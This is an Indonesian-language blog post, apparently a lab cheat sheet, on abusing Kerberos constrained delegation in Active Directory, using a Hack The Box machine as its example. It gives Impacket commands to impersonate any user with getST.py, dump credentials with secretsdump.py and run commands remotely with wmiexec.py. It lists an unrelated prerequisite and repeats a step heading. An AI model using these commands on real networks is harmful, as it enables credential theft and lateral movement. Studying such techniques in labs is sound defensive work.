---
title: '[Kerberos] AllowToDelegate Abuse (Constrained Delegation)'
date: 2022-05-05 11:10:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, readgmsapassword Abuse, privilege escalation, lateral movement]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

**Constrained delegation** memungkinkan prinsipal untuk mengautentikasi sebagai pengguna mana pun ke layanan tertentu di komputer target.

Artinya, sebuah node dengan hak istimewa ini dapat meniru (*impersonate*) *domain princial* apa pun (termasuk Domain Admins) ke layanan tertentu pada komputer target.

### Tujuan 

- *Privilege escalation* atau
- *lateral movement*

### Prasyarat

- User dengan hak akses `ReadGMSAPassword`


### Tools

- Impacket

---

## Tahapan eksploitasi

### Step 1: Cek Hak Akses Dengan BloodHound

Pada contoh kasus kali ini, user **SVC_INT.INTELLIGENCE.HTB** memiliki hak akses `constrained delegation` ke komputer **DC.INTELLIGENCE.HTB**.

![Bloodhound - allowtodelegate](/assets/img/posts/allowtodelegate-abuse/1.png)


### Step 2: Ketahui SPN yang Dapat Diakses

Kita dapat mengetahui SPN yang didelegasikan pada suatu user pada Bloodhound.

Terlihat pada kasus ini SPN yang dapat didelegasikan untuk user **SVC_INT**  adalah **WWW/DC.INTELLIGENCE.HTB**

![Bloodhound - Delegate SPN](/assets/img/posts/allowtodelegate-abuse/2.png)

### Step 3: Ketahui SPN yang Dapat Diakses

```bash
# Generate ticket baru sebagai user yang diinginkan
➜ getST.py -spn <SPN> -impersonate <user> <domai>/<username>:<password>@<ip-dc>
➜ getST.py -spn <SPN> -impersonate <user> <domai>/<username>@<ip-dc> -hashes <hash>

# Membuat variable KRB5CCNAME sebagai ticket untuk diakses oleh Impacket
➜ export KRB5CCNAME=administrator.ccache 

# Gunakan ticket pada Impacket
➜ secretsdump.py -k -no-pass <domain>
➜ wmiexec.py -k -no-pass <domain>
```

--- 

## Referensi

- https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html#get-ticket
- https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/
- http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-constrained-delegation